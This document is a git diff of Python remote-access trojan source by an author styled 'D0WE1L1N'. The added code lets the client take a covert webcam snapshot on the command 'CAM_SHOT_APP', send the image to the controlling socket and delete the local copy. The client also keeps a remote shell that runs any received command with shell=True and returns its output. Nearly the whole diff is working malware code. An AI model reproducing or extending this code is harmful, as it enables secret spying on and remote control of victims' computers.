@@ -4,13 +4,14 @@
 # @Author    :D0WE1L1N
 import os
 import socket
-import subprocess
+from subprocess import Popen, PIPE
 import sys
 import shutil
-import win32api
-import win32con
-import win32gui
-import win32ui
+from cv2 import VideoCapture, imwrite
+# import win32api
+# import win32con
+# import win32gui
+# import win32ui
 def PINGPONG_client(ip, port):
     try:
         try:
@@ -26,6 +27,25 @@ def PINGPONG_client(ip, port):
                 s.close()
                 CMD_client(ip, cmd_port, port)
                 break
+            if data.decode() == "CAM_SHOT_APP":
+                s.send(bytes("OK", 'utf8'))
+                cap = VideoCapture(0)
+                while True:
+                    f, frame = cap.read()
+                    imwrite('image.jpg', frame) 
+                    cap.release()
+                    break
+                with open("image.jpg", "rb") as f:
+                    img_data = f.read()
+                len_data = len(img_data)
+                s.send(bytes(str(len_data), 'utf8'))
+                check = s.recv(1024)
+                if check:
+                    s.sendall(img_data)
+                re_check = s.recv(1024)
+                os.remove("image.jpg")
+                if re_check:
+                    continue
             if data.decode() == "EXIT_APP":
                 s.close()
                 break
@@ -86,8 +106,8 @@ def CMD_client(ip, port, main_port):
             elif cmd_command.decode("utf8") == "PING":
                 cmd_c.send(bytes("PONG", "utf8"))
             else:
-                cmd = subprocess.Popen(cmd_command.decode(
-                    "utf8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                cmd = Popen(cmd_command.decode(
+                    "utf8"), shell=True, stdout=PIPE, stderr=PIPE)
                 cmd_print_out = cmd.stdout.read()
                 if not cmd_print_out:
                     cmd_print_out = cmd.stderr.read()
@@ -95,3 +115,4 @@ def CMD_client(ip, port, main_port):
         cmd_c.close()
     except:
         sys.exit(1)
+PINGPONG_client("127.0.0.1", 624)
